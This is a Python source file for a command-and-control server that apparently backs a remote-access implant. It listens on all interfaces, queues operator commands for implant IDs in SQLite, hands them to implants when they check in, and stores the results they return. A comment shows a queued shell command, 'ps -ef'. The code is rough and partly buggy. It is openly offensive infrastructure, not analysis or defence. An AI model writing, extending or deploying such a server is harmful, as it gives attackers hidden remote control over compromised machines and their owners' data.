#!/usr/bin/env python3.6

import socketserver
import sqlite3
import threading
import logging

logging.basicConfig(level=logging.DEBUG,
                    format='%(name)s: %(message)s', )  # Sets up teh basic logging format



############################
### Tasking Methods
############################

def get_tasking(implant_id,dbConn):
    c = dbConn.cursor()
    implant_id = (implant_id)
    c.execute('select * from PendingTasks where uuid=?',implant_id)
    tasking = c.fetchone()[1]
    c.close()
    return tasking


def implant_checkin(implant_id,dbConn): # ADD Checking for legit impant call backs
    implant_id = (implant_id,)
    c = dbConn.cursor()
    c.execute('select * from Implants where uuid=?',implant_id)
    status = c.fetchone()
    c.close()
    # print(status[-1])
    if status[-1] == 'true':
        tasking =  get_tasking(implant_id,dbConn)
        if tasking == None: # ADD better tasking checking.
            return 3
        # print(tasking)
        return tasking

    else: return 2

def save_tasking_results(results, dbConn):
    tasking_tuple = (results[1], results[2]) # create the tuple for sqlite
    c = dbConn.cursor()
    c.execute('insert into PendingResults values(?,?)',tasking_tuple)
    dbConn.commit()
    c.close()
    return 0 # ADD error checking

def set_new_tasking(tasking, dbConn):
    uuid = tasking[1]
    new_task = tasking[2]
    task_tuple = (uuid,new_task) # cause sqlite3 prefers to use a single ? so it can sanatize
    c = dbConn.cursor()
    c.execute('insert into PendingTasks values(?,?)',task_tuple)
    dbConn.commit()
    c.close()
    return 0 # ADD error checking

def get_tasking_results(implant, dbConn):
    uuid = (implant[1],) # create tuple for sqlite3
    c = dbConn.cursor()
    c.execute("select results from PendingResults where uuid=?",uuid)
    results_tuple = c.fetchall()
    # I'm not proud of this one. This particular fetchall is returning a tuple..inside a list and I can't deal with it now.
    # FIX This monstrosity.
    results_string = "{}".format(results_tuple).encode()
    c.close()
    return results_string

############################
### Network Handlers
############################

class MyHandler(socketserver.BaseRequestHandler):
    '''
        The main class that handles requests. This will do most of the work,
        or pass it off to above methods.

        All incoming message strings are decoded and split into a list.
        They should come in the following format:
        "type of call in | uuid | <optional args>"
        Will check for 1 of 4 possible call in types:
            implant_checkin -- A regular implant call back. It will check for updated tasking.
            tasking-return -- The implant returning the results of a task
            tasking-agent -- An incoming task for a given uuid
            retrieve-results -- A request for a given uuid
        Lists that were used for testing are commented above the respective call in checks.

    '''
    logger = logging.getLogger('MyHandler')
    logger.debug('__init__')

    def handle(self):  # The main method for the handler. Most everything will be done in here.
        implant_DB = 'implant.db' # db location
        dbConn = sqlite3.connect(implant_DB) # connection to db, will be passed to all the things...it's bad I know.
        self.logger.debug("Handle start")
        # msg should be recieved in "type of call in | uuid | options"
        msg = self.request.recv(1024).decode().split('|') # recieve and split on "|" the msg for better parsing
        print(msg)
        self.logger.debug('{}'.format(msg))

        # Regular implant callback
        # ['implant_checkin','112']
        if msg[0] == 'implant_checkin': # ['implant_checkin','uuid']
            self.logger.debug("Implant Checked in")
            new_tasking = implant_checkin(msg[1],dbConn).encode()
            print(type(new_tasking))
            if new_tasking == 2: # No new Tasking
                self.logger.debug("There wasn't any new tasking for {}".format(msg[0]))
                return # return so that connection kills itself
            if new_tasking == 3: # Error with tasking format
                self.logger.debug("There was an error with the tasking for {}".format(msg[0]))
                return # return so that connection kills itself
            elif type(new_tasking) == bytes: # Check that there is tasking and that it's formatted in byte for transmission
                self.logger.debug("Sending {} for tasking to {}".format(new_tasking.decode(),msg[1]))
                self.request.send(new_tasking)
            else: return

        # Implant returning tasking results
        # ['tasking-return','112']
        elif msg[0] == 'tasking-return': # ['tasking-return','uuid','command results']
            self.logger.debug("Looking up recent results for {}".format(msg[1]))
            if save_tasking_results(msg,dbConn) == 0:
                self.logger.debug("Recent results for {} has been saved".format(msg[1]))

        # The tasking script calling in to leave tasking
        # ['tasking-agent','112',"cmd: ps -ef --sort start_time"]
        elif msg[0] == 'tasking-agent': #['tasking-agent','uuid','tasking for implant']
            if set_new_tasking(msg,dbConn) == 0:
                self.logger.debug("Tasking for {} has been saved".format(msg[1]))
                self.request.send(b'Tasking has been saved')

        # The tasking script calling in to recieve results
        # ['retrieve-results','112']
        elif msg[0] == 'retrieve-results':
            results = get_tasking_results(msg,dbConn) # returns a byte string
            if results != None: # ADD error checking
                self.logger.debug("Gathered results from {}".format(msg[1]))
                self.request.sendall(results)
        else: return # return so that the connection kills itself


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    '''
        This just handles the  threading of the server. Not much here.
    '''
    timeout = 10
    allow_reuse_address = True
    logger = logging.getLogger('ThreadedTCPServer')
    logger.debug('__init__')

    def server_activate(self):
        self.logger.debug('server_activate')
        socketserver.TCPServer.server_activate(self)
        return

    def serve_forever(self, poll_interval=0.5):
        self.logger.debug('waiting for request')
        self.logger.info(
            'Handling requests, press <Ctrl-C> to quit'
        )
        socketserver.TCPServer.serve_forever(self, poll_interval)
        return

    def handle_request(self):
        self.logger.debug('handle_request')
        return socketserver.TCPServer.handle_request(self)

    def verify_request(self, request, client_address):
        self.logger.debug('verify_request(%s, %s)',
                          request, client_address)
        return socketserver.TCPServer.verify_request(
            self, request, client_address, )
    def server_close(self):
        self.logger.debug('server_close')
        return socketserver.TCPServer.server_close(self)


    def finish_request(self, request, client_address):
        self.logger.debug('finish_request(%s, %s)',
                      request, client_address)
        return socketserver.TCPServer.finish_request(
        self, request, client_address,
        )


    def close_request(self, request_address):
        self.logger.debug('close_request(%s)', request_address)
        return socketserver.TCPServer.close_request(
        self, request_address,
        )


    def shutdown(self):
        self.logger.debug('shutdown()')
        return socketserver.TCPServer.shutdown(self)


    def handle_timeout(self):
        self.logger.debug('Timeout')
        pass


def main():
    host, port = "0.0.0.0", 65533
    # Create the server, binding to localhost on port 65533
    server = ThreadedTCPServer((host, port), MyHandler)  # Creating the server object

    # Activate the server; this will keep running until you
    # interrupt the program with Ctrl-C

    try:  # Starting the server and the continuous threads.
        server_thread = threading.Thread(target=server.serve_forever())
        server_thread.daemon = True
        server_thread.start()
        print('server started')

    except KeyboardInterrupt:
        server.shutdown()


if __name__ == '__main__':
    main()
